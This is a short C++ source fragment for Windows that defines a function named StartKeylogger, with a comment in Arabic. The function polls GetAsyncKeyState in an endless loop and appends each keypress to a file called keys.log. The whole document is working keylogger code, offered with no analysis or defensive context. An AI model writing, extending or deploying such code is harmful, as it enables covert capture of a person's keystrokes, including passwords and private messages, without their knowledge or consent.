#include <fstream>
#include <windows.h>

void StartKeylogger() {
    char key;
    while (true) {
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                std::ofstream log("keys.log", std::ios::app);
                log << key; // تسجيل المفتاح
                log.close();
            }
        }
    }
}
